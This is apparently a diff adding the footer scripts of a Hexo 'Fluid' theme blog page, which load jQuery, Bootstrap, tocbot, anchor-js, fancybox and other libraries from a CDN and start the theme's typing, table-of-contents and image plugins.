+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/stars.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
